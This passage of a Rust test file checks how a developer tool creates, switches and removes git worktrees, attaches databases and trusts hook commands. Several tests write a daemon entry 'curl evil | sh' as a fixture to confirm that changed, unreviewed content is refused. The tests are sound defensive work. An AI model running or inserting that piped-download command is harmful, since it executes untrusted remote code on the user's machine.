        Some(Status::NeedsAttention),
        "the old environment still exports the binding"
    );
    let again = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(
        again.warnings.iter().any(|w| w.contains("unmapped")),
        "{:?}",
        again.warnings
    );
    assert_eq!(again.status, Status::Ready);
    let env = env_map(&w);
    assert!(
        !env.contains_key("DATABASE_URL") && !env.contains_key("PGHOST"),
        "the database is no longer exported: {env:?}"
    );
    let stored = receipt_of(&w);
    assert_eq!(stored.version, 2);
    assert_eq!(stored.unmapped.as_ref().map(|d| d.url.as_str()), Some(url));
}

#[test]
fn database_url_attaches_without_provisioning_and_is_detach_only() {
    let t = plain();
    let url = "postgres://dfl_x:p%40ss@db.internal:6543/df_proj_x?sslmode=require";
    let out = create(
        &t.project,
        "sandbox",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let binding = binding(&out.receipt);
    assert_eq!(binding.branch_id, None);
    assert!(!binding.owned);
    assert_eq!(binding.source, "url");
    assert_eq!(binding.url, url);
    assert_eq!(
        (binding.database.as_str(), binding.role.as_str()),
        ("df_proj_x", "dfl_x")
    );

    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], url);
    assert_eq!(env["PGHOST"], "db.internal");
    assert_eq!(env["PGPORT"], "6543");
    assert_eq!(env["PGUSER"], "dfl_x");
    assert_eq!(env["PGPASSWORD"], "p@ss");
    assert_eq!(env["PGDATABASE"], "df_proj_x");

    // Attachments can be neither reset nor snapshotted, and removal never drops anything.
    let w = out.workspace;
    let error = setup::reset_data(&t.project, &w, None).unwrap_err();
    assert!(error.to_string().contains("URL only"), "{error:#}");
    assert!(setup::snapshot(&t.project, &w, "seed").is_err());
    let removed = setup::remove(
        &t.project,
        "sandbox",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(removed.dropped_branch, None);
    assert!(!w.path.exists());

    assert!(
        create(
            &t.project,
            "bad",
            SetupOptions {
                database_url: Some("mysql://x/y".into()),
                ..Default::default()
            }
        )
        .is_err()
    );
}

#[test]
fn no_db_skips_the_database_even_with_a_url() {
    let t = plain();
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            database_url: Some("postgres://u:p@h/d".into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(out.receipt.services.is_empty());
    assert_eq!(
        out.receipt.phase(Phase::Services).state,
        PhaseState::Skipped
    );
}

#[test]
fn path_collisions_are_refused_without_side_effects() {
    let t = plain();
    create(&t.project, "feature/a", SetupOptions::default()).unwrap();
    let error = create(&t.project, "feature-a", SetupOptions::default()).unwrap_err();
    assert!(error.to_string().contains("already exists"), "{error:#}");
    assert_eq!(worktree::list(&t.project).unwrap().len(), 2);
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("feature-a", git2::BranchType::Local)
            .is_err()
    );
    // A plain directory in the way is refused too, and left untouched.
    let blocked = worktree::path_for(&t.project, "taken");
    std::fs::create_dir_all(&blocked).unwrap();
    std::fs::write(blocked.join("mine.txt"), "keep").unwrap();
    assert!(create(&t.project, "taken", SetupOptions::default()).is_err());
    assert_eq!(
        std::fs::read_to_string(blocked.join("mine.txt")).unwrap(),
        "keep"
    );
}

#[test]
fn remove_checks_every_protection_before_any_effect() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "guarded", SetupOptions::default())
        .unwrap()
        .workspace;
    let remove = |name: &str, options: RemoveOptions| {
        setup::remove(&t.project, name, options, &mut NoProgress)
    };
    let still_there = || {
        assert!(w.path.exists(), "workspace must survive a refusal");
        assert!(
            !marker.exists(),
            "teardown must not run before the protections pass"
        );
    };

    // The default workspace, even forced.
    let error = remove(
        "main",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
    )
    .unwrap_err();
    assert!(error.to_string().contains("default workspace"), "{error:#}");
    assert!(!protection(&error).forceable);
    assert_eq!(protection(&error).workspace, "main");
    assert!(t.root.join("README.md").is_file());

    // The caller's directory, even forced and from a subdirectory.
    let sub = w.path.join("src/deep");
    std::fs::create_dir_all(&sub).unwrap();
    for force in [false, true] {
        let error = remove(
            "guarded",
            RemoveOptions {
                force,
                cwd: Some(sub.clone()),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(error.to_string().contains("current directory"), "{error:#}");
        assert!(
            !protection(&error).forceable,
            "--force cannot override this"
        );
        still_there();
    }

    // Dirty needs --force.
    std::fs::write(w.path.join("wip.txt"), "x").unwrap();
    let error = remove("guarded", RemoveOptions::default()).unwrap_err();
    assert!(error.to_string().contains("uncommitted"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();
    std::fs::remove_file(w.path.join("wip.txt")).unwrap();
    std::fs::remove_dir_all(w.path.join("src")).unwrap();

    // Locked needs --force.
    t.project
        .repo()
        .unwrap()
        .find_worktree("guarded")
        .unwrap()
        .lock(Some("busy"))
        .unwrap();
    let error = remove("guarded", RemoveOptions::default()).unwrap_err();
    assert!(error.to_string().contains("locked"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();
    t.project
        .repo()
        .unwrap()
        .find_worktree("guarded")
        .unwrap()
        .unlock()
        .unwrap();

    // Untrusted teardown hooks refuse (they would otherwise run unreviewed code).
    let mut changed = t.project.clone();
    changed.config.hooks.teardown.push("echo more".into());
    let error = setup::remove(
        &changed,
        "guarded",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("not trusted"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();

    // Unmerged branches are protected up front when deleting the branch.
    let repo = git2::Repository::open(&w.path).unwrap();
    std::fs::write(w.path.join("feature.txt"), "x").unwrap();
    commit_all(&repo, "feature work");
    let error = remove(
        "guarded",
        RemoveOptions {
            delete_branch: true,
            ..Default::default()
        },
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("not in the default workspace"),
        "{error:#}"
    );
    assert!(protection(&error).forceable);
    still_there();

    // With everything satisfied it goes: teardown first, then the worktree; branch kept by default.
    let out = remove("guarded", RemoveOptions::default()).unwrap();
    assert!(marker.exists(), "teardown ran");
    assert!(out.hooks.unwrap().ok);
    assert!(!w.path.exists());
    assert!(!w.git_dir.exists());
    assert!(!out.deleted_branch && out.dropped_branch.is_none());
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("guarded", git2::BranchType::Local)
            .is_ok()
    );
}

#[test]
fn teardown_failure_blocks_removal_unless_forced() {
    let t = repo(
        &Hooks {
            teardown: &["echo cleaning; exit 5"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "stuck", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut rec = Recorder::default();
    let error = setup::remove(&t.project, "stuck", RemoveOptions::default(), &mut rec).unwrap_err();
    assert!(error.to_string().contains("exit 5"), "{error:#}");
    assert!(protection(&error).forceable, "--force removes it anyway");
    assert!(w.path.exists(), "removal was blocked");
    assert!(rec.lines.iter().any(|l| l == "cleaning"));

    let out = setup::remove(
        &t.project,
        "stuck",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(!out.hooks.unwrap().ok);
    assert!(
        out.warnings.iter().any(|w| w.contains("exit 5")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn forced_removal_handles_dirty_locked_untrusted_and_deletes_branches() {
    let t = repo(
        &Hooks {
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "doomed", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::write(w.path.join("wip.txt"), "x").unwrap();
    t.project
        .repo()
        .unwrap()
        .find_worktree("doomed")
        .unwrap()
        .lock(None)
        .unwrap();
    let out = setup::remove(
        &t.project,
        "doomed",
        RemoveOptions {
            force: true,
            delete_branch: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(
        out.hooks.is_none(),
        "untrusted teardown hooks are skipped under --force"
    );
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(out.deleted_branch);
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("doomed", git2::BranchType::Local)
            .is_err()
    );
    assert!(!w.path.parent().unwrap().join("teardown-ran").exists());
}

#[test]
fn removing_a_merged_branch_and_a_vanished_directory() {
    let t = plain();
    let a = create(&t.project, "merged", SetupOptions::default())
        .unwrap()
        .workspace;
    let out = setup::remove(
        &t.project,
        "merged",
        RemoveOptions {
            delete_branch: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.deleted_branch,
        "no commits of its own, so it counts as merged"
    );
    assert!(!a.path.exists());

    let b = create(&t.project, "vanished", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(&b.path).unwrap();
    assert!(
        setup::list(&t.project)
            .unwrap()
            .iter()
            .any(|s| s.workspace.missing)
    );
    setup::remove(
        &t.project,
        "vanished",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(worktree::list(&t.project).unwrap().len(), 1);
    assert!(
        setup::remove(
            &t.project,
            "vanished",
            RemoveOptions::default(),
            &mut NoProgress
        )
        .is_err()
    );
}

#[test]
fn switch_runs_switch_hooks_each_time_but_only_when_trusted_and_ready() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "hop", SetupOptions::default())
        .unwrap()
        .workspace;
    let log = w.path.join(".devflow/switch.log");

    // Untrusted: a warning, not a failure.
    let out = setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.hooks.is_none());
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(!log.exists());

    trust::approve(&t.project).unwrap();
    for _ in 0..2 {
        let out = setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
        assert!(out.warnings.is_empty(), "{:?}", out.warnings);
        assert!(out.hooks.unwrap().ok);
    }
    assert_eq!(
        std::fs::read_to_string(&log).unwrap(),
        "switched\nswitched\n"
    );
    let out = setup::switch(
        &t.project,
        &w,
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.hooks.is_none());
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 2);

    // A failing switch hook is a warning with the report attached.
    let mut failing = t.project.clone();
    failing.config.hooks.switch = vec!["exit 9".into()];
    trust::approve(&failing).unwrap();
    let out = setup::switch(&failing, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("exit 9") || w.contains("code 9")),
        "{:?}",
        out.warnings
    );
    assert!(!out.hooks.unwrap().ok);
    assert_eq!(
        out.status,
        Status::Ready,
        "switch hooks never poison the receipt"
    );
}

#[test]
fn switch_resumes_an_incomplete_setup_first() {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            switch: &["touch .devflow/switch-ran"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "later", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(!w.path.join(".devflow/setup-ran").exists());
    trust::approve(&t.project).unwrap();
    let out = setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(w.path.join(".devflow/setup-ran").exists());
    assert!(w.path.join(".devflow/switch-ran").exists());
}

#[test]
fn trust_is_judged_by_the_target_workspaces_pitchfork_files_not_the_main_checkouts() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let main = git2::Repository::open(&t.root).unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&main, "add the api daemon");
    // The main checkout is what gets approved.
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "feature", SetupOptions::default())
        .unwrap()
        .workspace;
    let log = w.path.join(".devflow/switch.log");
    let switch = || setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress);
    let out = switch().unwrap();
    assert!(out.hooks.is_some(), "{:?}", out.warnings);
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 1);

    // The linked worktree's daemon changes (and is committed there).
    std::fs::write(
        w.path.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&w.path).unwrap(),
        "change the daemon",
    );
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted,
        "the main checkout is untouched"
    );
    assert!(matches!(
        trust::state_at(&t.project, &w.path).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
    assert_ne!(
        trust::digest_at(&t.project, &w.path),
        trust::digest(&t.project)
    );

    // Switch hooks do not run in the worktree on the main checkout's approval.
    let out = switch().unwrap();
    assert!(out.hooks.is_none());
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 1);
    assert!(
        setup::run_switch_hooks(&t.project, &w, &SetupOptions::default(), &mut NoProgress)
            .unwrap()
            .is_none()
    );
    // Neither does teardown.
    let error = setup::remove(
        &t.project,
        "feature",
        RemoveOptions {
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        protection(&error)
            .reason
            .contains("teardown hooks are not trusted"),
        "{error:#}"
    );
    assert!(w.path.exists() && !t.root.parent().unwrap().join("teardown-ran").exists());

    // Approving what the worktree asks to run lets them run there.
    let reviewed = trust::scope_at(&t.project, &w.path);
    trust::approve_scope_at(&t.project, &w.path, &reviewed).unwrap();
    let out = switch().unwrap();
    assert!(out.hooks.is_some(), "{:?}", out.warnings);
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 2);
}

/// A repository whose main checkout has a daemon, plus a local branch
/// `feature` that was committed with another one: the existing-branch case of
/// `switch -c feature`.
fn repo_with_a_branch_of_other_processes() -> Repo {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            ..Default::default()
        },
        "[env]\nREVIEWED = \"1\"\n",
    );
    let git = git2::Repository::open(&t.root).unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&git, "the daemon everyone reviewed");
    let reviewed = git.head().unwrap().peel_to_commit().unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    commit_all(&git, "another daemon on the branch");
    let other = git.head().unwrap().peel_to_commit().unwrap();
    git.branch("feature", &other, false).unwrap();
    git.reset(reviewed.as_object(), git2::ResetType::Hard, None)
        .unwrap();
    t
}

#[test]
fn an_approval_of_the_source_scope_runs_nothing_in_a_target_that_holds_other_processes() {
    let t = repo_with_a_branch_of_other_processes();
    // What the person reviewed and approved for this one run: the main
    // checkout's scope (the workspace the new one is made from).
    let reviewed = trust::scope(&t.project);
    let approval = Some(trust::Approval::of(&reviewed));
    let options = SetupOptions {
        approval: approval.clone(),
        ..Default::default()
    };

    let out = create(&t.project, "feature", options).unwrap();
    assert_eq!(
        out.status,
        Status::NeedsAttention,
        "{:?}",
        out.receipt.phases
    );
    assert!(out.approval_differs);
    assert!(
        !out.workspace.path.join(".devflow/setup-ran").exists(),
        "the setup hook did not run on the strength of another scope"
    );
    assert!(out.hooks.is_none());
    for phase in [Phase::Env, Phase::Hooks] {
        let record = out.receipt.phase(phase);
        assert!(
            record.required_skip
                && record
                    .detail
                    .as_deref()
                    .is_some_and(|d| d.contains("differs from what you reviewed")),
            "{phase:?}: {record:?}"
        );
    }
    assert!(
        !env_map(&out.workspace).contains_key("REVIEWED"),
        "the [env] recipes were not applied"
    );
    assert!(matches!(
        trust::state_at(&t.project, &out.workspace.path).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
    // Nothing was stored either.
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted {
            previously_trusted: false,
            ..
        }
    ));

    // The same approval resumes nothing: still another scope.
    let again = setup::setup(
        &t.project,
        &out.workspace,
        SetupOptions {
            approval,
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(again.approval_differs);
    assert!(!again.workspace.path.join(".devflow/setup-ran").exists());

    // Reviewing what the workspace actually holds is what lets it run.
    let own = trust::scope_at(&t.project, &out.workspace.path);
    assert_ne!(own.digest, reviewed.digest);
    let resumed = setup::setup(
        &t.project,
        &out.workspace,
        SetupOptions {
            approval: Some(trust::Approval::of(&own)),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        resumed.status,
        Status::Ready,
        "{:?}",
        resumed.receipt.phases
    );
    assert!(!resumed.approval_differs);
    assert!(resumed.workspace.path.join(".devflow/setup-ran").exists());
    assert_eq!(env_map(&resumed.workspace)["REVIEWED"], "1");
}

#[test]
fn an_approval_of_the_source_scope_runs_in_a_target_with_the_same_scope() {
    let t = repo_with_a_branch_of_other_processes();
    let approval = Some(trust::Approval::of(&trust::scope(&t.project)));
    let out = create(
        &t.project,
        "same",
        SetupOptions {
            approval,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(!out.approval_differs);
    assert!(out.workspace.path.join(".devflow/setup-ran").exists());
    assert_eq!(env_map(&out.workspace)["REVIEWED"], "1");
}

#[test]
fn switch_hooks_and_teardown_are_refused_on_an_approval_of_other_content() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let main = git2::Repository::open(&t.root).unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&main, "daemon");
    let w = create(&t.project, "feature", SetupOptions::default())
        .unwrap()
        .workspace;
    // Another pitchfork file in the worktree than the one that was reviewed.
    std::fs::write(
        w.path.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    commit_all(&git2::Repository::open(&w.path).unwrap(), "other daemon");
    let approval = Some(trust::Approval::of(&trust::scope(&t.project)));
    let out = setup::switch(
        &t.project,
        &w,
        SetupOptions {
            approval: approval.clone(),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.hooks.is_none());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("differs from what you reviewed")),
        "{:?}",
        out.warnings
    );
    assert!(!w.path.join(".devflow/switch.log").exists());

    let error = setup::remove(
        &t.project,
        "feature",
        RemoveOptions {
            approval,
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(protection(&error).forceable, "{error:#}");
    assert!(
        protection(&error)
            .reason
            .contains("differs from what you reviewed"),
        "{error:#}"
    );
    assert!(w.path.exists() && !t.root.parent().unwrap().join("teardown-ran").exists());
}

#[test]
fn project_without_postgres_has_no_database_operations() {
    let t = plain();
    let w = create(&t.project, "nodatabase", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(setup::reset_data(&t.project, &w, None).is_err());
    assert!(setup::snapshot(&t.project, &w, "seed").is_err());
    assert!(setup::snapshot(&t.project, &w, "bad name").is_err());
}

#[test]
fn env_vars_include_database_entries_only_when_bound() {
    let t = plain();
    let w = create(&t.project, "vars", SetupOptions::default()).unwrap();
    let vars = setup::env_vars(&t.project, &w.workspace, &w.receipt);
    let keys: Vec<_> = vars.iter().map(|(k, _)| k.as_str()).collect();
    assert_eq!(
        keys,
        [
            "DEVFLOW_PROJECT",
            "DEVFLOW_PROJECT_ROOT",
            "DEVFLOW_WORKSPACE",
            "DEVFLOW_WORKSPACE_PATH",
            "DEVFLOW_SOURCE_PATH",
            "DEVFLOW_WORKSPACE_ID",
            "COMPOSE_PROJECT_NAME"
        ]
    );
    // Every generated name is one a recipe may reference (and none can be set).
    for key in &keys {
        assert!(
            env_file::is_generated(key) && env_file::is_reserved(key),
            "{key}"
        );
    }
    // The default workspace has no source path.
    let default = worktree::list(&t.project).unwrap().remove(0);
    let receipt = Receipt::new(t.project.id(), &default.name, None);
    let keys: Vec<_> = setup::env_vars(&t.project, &default, &receipt)
        .into_iter()
        .map(|(k, _)| k)
        .collect();
    assert!(!keys.contains(&"DEVFLOW_SOURCE_PATH".to_string()));
}

#[test]
fn doctor_reports_a_workspace_that_needs_attention() {
    let t = repo(
        &Hooks {
            setup: &["true"],
            ..Default::default()
        },
        "",
    );
    create(&t.project, "pending", SetupOptions::default()).unwrap();
    let checks = devflow_core::doctor::run(Some(&t.project));
    let workspaces: Vec<_> = checks.iter().filter(|c| c.name == "workspaces").collect();
    assert!(
        workspaces.iter().any(|c| c.detail.contains("pending")),
        "{workspaces:?}"
    );
    let trust = checks.iter().find(|c| c.name == "hook-trust").unwrap();
    assert_eq!(trust.status, devflow_core::doctor::CheckStatus::Warn);
}

#[test]
fn removing_a_vanished_workspace_never_deletes_what_replaced_it() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "vanished", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(&w.path).unwrap();
    // An ordinary directory is created at the same path.
    std::fs::create_dir_all(w.path.join("src")).unwrap();
    std::fs::write(w.path.join("src/precious.txt"), "keep").unwrap();
    assert!(ws(&t.project, "vanished").missing);

    for force in [false, true] {
        let error = setup::remove(
            &t.project,
            "vanished",
            RemoveOptions {
                force,
                ..Default::default()
            },
            &mut NoProgress,
        )
        .unwrap_err();
        let refusal = protection(&error);
        assert!(!refusal.forceable, "{refusal}");
        assert_eq!(refusal.workspace, "vanished");
        assert!(error.to_string().contains("not the checkout"), "{error:#}");
        assert_eq!(
            std::fs::read_to_string(w.path.join("src/precious.txt")).unwrap(),
            "keep",
            "force={force}"
        );
        assert!(!marker.exists());
        assert!(
            worktree::find(&t.project, "vanished").unwrap().is_some(),
            "the registration is left for the user to resolve"
        );
    }

    // Once the path is really free only the registration goes.
    std::fs::remove_dir_all(&w.path).unwrap();
    setup::remove(
        &t.project,
        "vanished",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(worktree::find(&t.project, "vanished").unwrap().is_none());
    assert!(!w.git_dir.exists());
    assert!(!w.path.exists(), "nothing was created in its place either");
}

fn expecting(w: &Workspace, instance_id: Option<uuid::Uuid>) -> setup::ExpectedWorkspace {
    setup::ExpectedWorkspace {
        path: w.path.clone(),
        instance_id,
        fingerprint: w.fingerprint.clone(),
    }
}

#[test]
fn removal_is_refused_when_the_workspace_is_not_the_one_that_was_shown() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let remove = |project: &Project, expect: Option<setup::ExpectedWorkspace>, force: bool| {
        setup::remove(
            project,
            "doc",
            RemoveOptions {
                force,
                expect,
                ..Default::default()
            },
            &mut NoProgress,
        )
    };
    let refused = |error: &anyhow::Error| {
        let refusal = protection(error);
        assert!(
            !refusal.forceable,
            "--force must not override this: {refusal}"
        );
        assert!(
            error.to_string().contains("changed since it was shown"),
            "{error:#}"
        );
    };

    // The view the user had: `doc` at one path with one receipt.
    let shown = create(&t.project, "doc", SetupOptions::default()).unwrap();
    let view = expecting(&shown.workspace, Some(shown.receipt.instance_id));

    // Recreated at the same path with a new receipt (a new instance).
    remove(&t.project, None, false).unwrap();
    assert!(marker.exists());
    std::fs::remove_file(&marker).unwrap();
    let again = create(&t.project, "doc", SetupOptions::default()).unwrap();
    assert_eq!(again.workspace.path, shown.workspace.path);
    assert_ne!(again.receipt.instance_id, shown.receipt.instance_id);
    for force in [false, true] {
        let error = remove(&t.project, Some(view.clone()), force).unwrap_err();
        refused(&error);
        assert!(error.to_string().contains("receipt"), "{error:#}");
        assert!(again.workspace.path.exists());
        assert!(!marker.exists(), "no teardown before the check");
    }

    // Recreated at another path.
    remove(&t.project, None, false).unwrap();
    std::fs::remove_file(&marker).unwrap();
    let mut moved = t.project.clone();
    moved.config.worktree.dir = t
        .root
        .parent()
        .unwrap()
        .join("elsewhere")
        .to_string_lossy()
        .into_owned();
    let elsewhere = create(&moved, "doc", SetupOptions::default()).unwrap();
    assert_ne!(elsewhere.workspace.path, shown.workspace.path);
    let same_receipt = expecting(&shown.workspace, Some(elsewhere.receipt.instance_id));
    for force in [false, true] {
        let error = remove(&moved, Some(same_receipt.clone()), force).unwrap_err();
        refused(&error);
        assert!(
            error
                .to_string()
                .contains(&elsewhere.workspace.path.display().to_string()),
            "{error:#}"
        );
        assert!(elsewhere.workspace.path.exists());
        assert!(!marker.exists());
    }

    // `None` means "had no receipt", and means it both ways.
    let bare = worktree::create(&moved, "bare", None).unwrap();
    let bare_remove = |expect: setup::ExpectedWorkspace| {
        setup::remove(
            &moved,
            "bare",
            RemoveOptions {
                expect: Some(expect),
                ..Default::default()
            },
            &mut NoProgress,
        )
    };
    refused(&bare_remove(expecting(&bare, Some(uuid::Uuid::new_v4()))).unwrap_err());
    assert!(bare.path.exists());
    let error = remove(&moved, Some(expecting(&elsewhere.workspace, None)), false).unwrap_err();
    refused(&error);
    assert!(elsewhere.workspace.path.exists());
    assert!(!marker.exists());

    // The right view removes: teardown runs, then the worktree goes.
    bare_remove(expecting(&bare, None)).unwrap();
    assert!(!bare.path.exists());
    let current = expecting(&elsewhere.workspace, Some(elsewhere.receipt.instance_id));
    // A path spelled through a symlink or with `..` is the same path.
    let mut spelled = current.clone();
    spelled.path = elsewhere
        .workspace
        .path
        .join("..")
        .join(elsewhere.workspace.path.file_name().unwrap());
    remove(&moved, Some(spelled), false).unwrap();
    assert!(marker.exists(), "teardown ran");
    assert!(!elsewhere.workspace.path.exists());
}

#[test]
fn a_receipt_replaced_after_the_first_check_is_still_caught() {
    // The listing and the removal can be far apart; the receipt read under the
    // lock is what counts.
    let t = plain();
    let w = create(&t.project, "swap", SetupOptions::default()).unwrap();
    let shown = expecting(&w.workspace, Some(w.receipt.instance_id));
    // Fork it: same path, new identity.
    let out = setup::setup(
        &t.project,
        &w.workspace,
        SetupOptions::default(),
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_ne!(out.receipt.instance_id, w.receipt.instance_id);
    let error = setup::remove(
        &t.project,
        "swap",
        RemoveOptions {
            expect: Some(shown),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("changed since it was shown"),
        "{error:#}"
    );
    assert!(w.workspace.path.exists());
    assert_eq!(receipt_of(&w.workspace), out.receipt);
}

#[test]
fn removing_a_workspace_that_contains_another_is_refused_even_forced() {
    let t = plain();
    let outer = create(&t.project, "outer", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut nested = t.project.clone();
    nested.config.worktree.dir = outer.path.join("nested").to_string_lossy().into_owned();
    worktree::create(&nested, "inner", None).unwrap();
    let error = setup::remove(
        &t.project,
        "outer",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("lives inside"), "{error:#}");
    assert!(!protection(&error).forceable);
    assert!(outer.path.exists());
}

#[test]
fn concurrent_creation_of_names_sharing_a_directory_leaves_one_intact_workspace() {
    let t = plain();
    let barrier = std::sync::Barrier::new(2);
    let results: Vec<_> = std::thread::scope(|scope| {
        let handles: Vec<_> = ["feature/a", "feature-a"]
            .into_iter()
            .map(|name| {
                let (project, barrier) = (&t.project, &barrier);
                scope.spawn(move || {
                    barrier.wait();
                    create(project, name, SetupOptions::default())
                })
            })
            .collect();
        handles.into_iter().map(|h| h.join().unwrap()).collect()
    });
    let winners: Vec<_> = results.iter().filter_map(|r| r.as_ref().ok()).collect();
    assert_eq!(winners.len(), 1, "{results:?}");
    let error = results.iter().find_map(|r| r.as_ref().err()).unwrap();
    assert!(error.to_string().contains("already exists"), "{error:#}");

    let winner = winners[0];
    assert_eq!(winner.status, Status::Ready);
    assert!(winner.workspace.path.join("README.md").is_file());
    assert_eq!(receipt_of(&winner.workspace), winner.receipt);
    let all = worktree::list(&t.project).unwrap();
    assert_eq!(all.len(), 2);
    assert!(!all[1].missing);
}

#[test]
fn a_symlinked_devflow_directory_is_never_written_through() {
    let t = plain();
    let w = worktree::create(&t.project, "linked", None).unwrap();
    let outside = tempfile::tempdir().unwrap();
    let sentinel = outside.path().join("env");
